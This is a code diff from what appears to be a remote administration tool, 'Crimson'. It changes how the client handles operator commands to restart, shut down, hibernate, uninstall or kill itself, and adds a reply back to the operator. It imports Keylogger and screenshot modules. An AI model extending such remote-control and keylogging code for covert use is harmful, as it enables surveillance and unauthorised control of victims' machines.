@@ -35,6 +35,7 @@ import com.google.protobuf.ByteString;
 import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.ClientStore;
 import com.subterranean_security.crimson.client.modules.Keylogger;
+import com.subterranean_security.crimson.client.modules.Power;
 import com.subterranean_security.crimson.client.modules.QuickScreenshot;
 import com.subterranean_security.crimson.client.stream.CInfoSlave;
 import com.subterranean_security.crimson.core.Common;
@@ -59,6 +60,7 @@ import com.subterranean_security.crimson.core.proto.Log.RS_Logs;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.proto.Misc.Outcome;
 import com.subterranean_security.crimson.core.proto.Screenshot.RS_QuickScreenshot;
+import com.subterranean_security.crimson.core.proto.State.RS_ChangeClientState;
 import com.subterranean_security.crimson.core.proto.Stream.Param;
 import com.subterranean_security.crimson.core.proto.Update.RS_GetClientConfig;
 import com.subterranean_security.crimson.core.stream.Stream;
@@ -160,48 +162,41 @@ public class ClientExecutor extends BasicExecutor {
 	}
 
 	private void rq_change_client_state(Message m) {
-		// TODO reply
 		log.debug("Received state change request: {}", m.getRqChangeClientState().getNewState().toString());
+		Outcome outcome = null;
+
 		switch (m.getRqChangeClientState().getNewState()) {
-		case FUNCTIONING_OFF:
-			break;
-		case FUNCTIONING_ON:
-			break;
 		case RESTART:
-			Native.restart();
+			outcome = Power.restart();
 			break;
 		case SHUTDOWN:
-			Native.poweroff();
-			break;
-		case UNINSTALL:
+			outcome = Power.shutdown();
 			break;
 		case HIBERNATE:
-			Native.hibernate();
+			outcome = Power.hibernate();
 			break;
 		case STANDBY:
-			Native.standby();
+			outcome = Power.standby();
+			break;
+		case UNINSTALL:
+			outcome = Power.uninstall();
 			break;
 		case RESTART_PROCESS:
-			try {
-				CUtil.Misc.runBackgroundCommand("java -jar "
-						+ new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath())
-								.getAbsolutePath(),
-						4);
-				System.exit(0);
-			} catch (IOException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			} catch (URISyntaxException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
+			outcome = Power.restartProcess();
 			break;
 		case KILL:
-			System.exit(0);
-			break;
-		default:
+			outcome = Outcome.newBuilder().setResult(true).build();
 			break;
 
+		default:
+			return;
+		}
+
+		connector.handle.write(Message.newBuilder().setId(m.getId())
+				.setRsChangeClientState(RS_ChangeClientState.newBuilder().setOutcome(outcome)).build());
+
+		if (outcome.getResult()) {
+			System.exit(0);
 		}
 
 	}
